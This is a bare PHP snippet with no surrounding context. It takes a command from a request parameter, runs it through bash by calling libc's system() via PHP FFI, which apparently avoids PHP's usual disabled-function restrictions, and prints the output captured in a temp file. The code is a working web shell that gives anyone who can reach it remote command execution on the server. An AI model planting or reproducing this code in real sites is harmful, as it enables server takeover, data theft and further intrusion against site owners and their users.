$tmp = tempnam(sys_get_temp_dir(), 'as');
$cmd = "/bin/bash -c \"".@base64_decode(base64_encode(get("cmd")))."\""." > ".$tmp." 2>&1";
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system($cmd);
echo @file_get_contents($tmp);
unlink($tmp);